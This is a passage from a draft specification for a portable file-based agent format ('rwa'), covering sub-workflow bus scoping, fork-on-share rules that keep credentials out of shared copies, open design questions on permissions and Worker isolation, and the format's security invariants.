- **`bus:<topics>`** is scoped to a **parent-prefixed sub-bus**: the sub-workflow sees topics under `<immediate_parent_id>/<topic>`, where `<immediate_parent_id>` is the parent's `DOC_UUID`. The prefix is *not* cumulative across nesting depths — a grandchild sees `<my_parent_id>/<topic>`, where its parent is itself a sub-workflow. Each level provides isolation from its grandparent: the grandchild cannot reach the grandparent's bus, only its immediate parent's sub-bus.

Parent and sub-workflow can communicate by convention through this sub-bus, but the sub-workflow cannot read or write the parent's other bus traffic. Nesting is depth-safe: arbitrary depths preserve per-level isolation, and explicit forwarding between levels is the only path for cross-level communication.

---

## 9. Fork-on-share for tools and agents

[Fork-on-share](https://www.ikangai.com/fork-on-share/) works straightforwardly for documents: the file is the seed, the recipient gets a sovereign copy, no write-back to the publisher. For workflows and agents the principle is the same but the seed needs more care.

The publish flow asks the publisher what to include:

- **Always included.** The workflow graph (structure, configuration, manifest), document content, configuration constants. Skill references travel as `(name, major_version)` pairs, not as implementations.
- **Never included.** The vault. Anything in `rwa_vault`. Skill implementations from the local library (the recipient resolves intent against their own library). Any input or output fields marked `sensitive: true` in the relevant skill schemas, including their appearances in run history.
- **Publisher's choice.** Non-sensitive run history (useful for "preloaded" examples), `rwa_workflow_state` (useful for templates that ship with seed data).

The default is conservative: state out, vault out, history out except where explicitly requested. The recipient receives a fresh agent with the same shape, no inherited credentials, and no inherited memory.

The publish step is an explicit boundary; the runtime surfaces what the seed will and will not contain before it leaves the publisher's machine. Fork-on-share for agents preserves the load-bearing claim of the document version — *that what arrives is fully owned by whoever opens it* — only if no secrets and no unwanted inherited state cross the boundary.

---

## 10. The "you stay in control" framing

The whole construction earns a single-sentence pitch: **the server is convenience, not custody.**

- A share URL is convenience for getting the file to a recipient; once they ⌘S, it's theirs.
- A remote rwa hosted on the web is convenience for accessing a tool without installing anything; copying it locally makes the remote optional.
- A scheduled cron run is convenience for unattended execution; moving the file to a different machine tomorrow keeps it running.
- A skill library shared between machines is convenience for portability; the skills run locally regardless.

None of these conveniences doubles as a leash. Compare to platform agents — Zapier, n8n SaaS, IFTTT, Custom GPTs, vendor-hosted automations — where convenience and leash are the same thing. You cannot have the tool without the platform's continued cooperation.

The rwa with skills and workflows brings the "documents you own" property of v0.10 to the agent layer. The agent is the file. The file is yours. Email it. Copy it. Fork it. Read its source. Audit its undo stack. The agent has no edges that aren't the file. Every other agent infrastructure today is, in this sense, *rented* — your relationship with your own agent is mediated by a custodian who can change its mind. The rwa form refuses the custodian.

This is not a feature comparison. It is a structural difference. Platform agents and file-agents are different categories of thing.

---

## 11. Open questions

### 11.1 Skill discovery between machines

Workflows declare required skills by name + major version. If a recipient lacks a required skill at the required major, the workflow opens read-only and the runtime offers to install or remap. A documented **common skill set** ships with the format — e.g. `http-get`, `http-post`, `send-email-smtp`, `save-to-file`, `read-from-rss`. The exact membership of the common set is deferred.

### 11.2 What counts as a "skill" vs. a primitive

Primitives are pure (no network, no credentials, no side effects beyond the workflow's own IDB and state store). Skills are everything else. The `transform` primitive uses `new Function()` with a restricted globals set — no `fetch`, no `document`, no `runtime.*`, no IDB, no vault.

### 11.3 Multi-user agents on shared machines

A workflow scheduled via cron on a shared Linux box runs as one user. Whose vault, whose skill library — whichever user's profile cron is running under. Multi-user automation on a shared host is a known unaddressed case.

### 11.4 The schedule UI

A workflow that wants to be cron-triggered has to live with a cron job somewhere on the user's OS. Setting up that cron job is the user's problem. Keep schedule setup out of the format; document the OS-level commands clearly.

### 11.5 What ships first: workflows or skills

Skills first. They earn their keep in a single-document context (a press release that can post itself) and don't require the visual UI of a graph.

### 11.6 The agent label

Working position: **document-first**. The architecture is recognizably agentic but the natural audience opens documents, not deploys agents; the agent label invites comparisons (multi-tenancy, vendor support, telemetry) the format intentionally doesn't optimize for; the demonstration path is stronger anyway.

### 11.7 Local-LLM fallback configuration

A workflow declaring `model: 'local'` should route through a user-configured local endpoint. The configuration surface (a runtime settings panel? a well-known location in the library? a `local-llm.html` companion rwa?) is deferred. Also relevant: how token counting normalizes across providers when a single workflow mixes hosted and local LLM calls.

### 11.8 Vault crypto parameter pinning

§3.4 fixes the shape (Argon2id, AES-GCM, per-entry IV, in-memory key with TTL). Specific Argon2id parameters need a review pass against a current threat model.

### 11.9 Skill share file format

Skills exported individually as `.rwa-skill.json` artifacts (§4.1). The exact JSON envelope, the signature/integrity story, and the install-from-share UX are unspecified. Current direction: a minimal manifest with no signature, treating skill imports the same way email attachments are treated.

### 11.10 Permission pattern syntax

Each permission tier in §4.2 names a pattern target but not the pattern language. Pattern syntax matters under the defense-in-depth framing (§2.4) — patterns inform install-time disclosure, constrain the common case, and document the contract — even though they aren't a cage. Critical anti-escalation rules: no left-unanchored wildcards on network domains (so `*.wordpress.com` cannot match `evil-wordpress.com.attacker.tld`), mandatory anchoring on FSA path patterns, explicit separation of read and write scopes on bus topics. v0.5 specifies the grammar for each tier.

### 11.11 Draft skill UI surface

§4.1 specifies that drafts can be test-invoked from the library viewer with `compute`-only permission. Several specifics are still open: are drafts visible across browser tabs? Can a draft test-invocation be cancelled mid-run? How are draft test results surfaced — inline in the viewer, in a separate console, or in the run-history store?

### 11.12 Worker-mode skills

Skills opting into `execution: 'worker'` in their manifest run in a dedicated Web Worker with no DOM access, no synchronous platform APIs, and a tightly controlled message-passing interface to runtime capabilities (vault, bus, FSA, fetch). This provides real adversarial-grade isolation — the proxy-bypass paths in §2.4 do not apply because the worker has its own global scope and is launched by the runtime, not by the skill code.

Worker-mode is the right answer when a skill comes from a source of unclear trust and the user wants a real cage rather than defense-in-depth. It's opt-in because most skills are user-authored or trusted-source and don't need the overhead and ergonomic restrictions of Worker isolation.

v0.4 commits to the existence of Worker-mode but not its design. Open in v0.5:

- The message-passing contract (RPC shape, async invocation, error propagation).
- Which runtime APIs are bridged into the Worker context, and how identity/permission enforcement works across the message boundary (the bound-proxy approach of §2.4 doesn't translate directly).
- Ergonomic costs to skill authors — Worker-mode skills are necessarily more cumbersome to write, and the spec should weigh how to surface this without becoming an obstacle to using Worker-mode where it matters.
- Whether Worker-mode becomes the default for skills imported from `.rwa-skill.json` artifacts (source-of-unclear-trust path) while remaining opt-in for library-authored skills.

---

## 12. Invariants (extended)

In addition to the v0.10 invariants:

8. The credential vault (`rwa_vault`) is scoped by user-declared namespaces, not by origin. Skills access only namespaces they were approved for at install time. Vault contents never serialize into any document's inline snapshot or shared variant.
9. Skills are local to the user, not to the document. A document declares intent; the local skill library provides capability. The library lives in a runtime-managed IDB store, not in any individual document.
10. **Skill installation is the privileged moment, and the trust anchor.** The runtime requires user review of skill code and permissions before adding a skill to the library, supported by an install-dialog static-analysis pass that surfaces proxy-bypassing capability uses (§4.1). No path exists from running code to "the library now has a new skill" without user-mediated review. The library API that adds skills is not exposed to skill code. Runtime permission enforcement at invocation time is defense-in-depth (§2.4), not a sandbox; install-time review is what defends against adversarial skills.
11. Self-modifying workflows cannot grant themselves new skills, cannot change their own trigger, and cannot bypass the commit gate to persist graph changes without explicit user action via ⌘S.
12. **Self-modifications persist only when the run is initiated by the manual trigger** — user clicks Run on the runtime's UI — *and* the user explicitly commits via ⌘S. All other triggers (`on_open`, `cron:*`, `on_change:*`) and document-driven programmatic invocations produce in-memory graph changes that discard at run end. Workflow state (`rwa_workflow_state`) persists across runs regardless of trigger; only workflow *structure* is bound by this rule. The runtime enforces the rule by inspecting the workflow's declared trigger and the call site for programmatic invocations, not by detecting headless mode.
13. The bootstrap continues to be the only immutable shell. Skills, workflows, vault, and their state all live in IDB and are subject to the same byte-identity rules as document state.
14. A workflow file is the same file in authoring, testing, and unattended (cron / headless) execution. Only the opener differs, and the persistence model is determined by the trigger and call site, not the opener.
15. The server (share host, remote runtime, cron host, sync target) is convenience, not custody. Any feature that requires the server to remain available, trustworthy, or cooperative for the file to keep working is rejected.

---

*Draft v0.4 — resolves the v0.3 review's major issue (§2.4 shadow-surface honesty) by committing to defense-in-depth proxies with install-time review as the trust anchor, supported by an install-dialog static-analysis pass (§4.1). Updates invariant 10 to make the trust anchor explicit. Adds Worker-mode skills as a deferred design (§11.12). Addresses the smaller items: default trigger (§5.1), user-clicked Run scope (§5.3, §6.2), extended execution mutex (§5.4), persistent cost counter (§5.7), vault API labeling (§3.2), sub-workflow idb scoping (§8.2). Carry-over deferrals from v0.3: §11.1, §11.7, §11.8, §11.9, §11.10, §11.11. Reference implementations do not yet exist; this document specifies behavior at the level needed to begin building, not at the level needed to ship.*
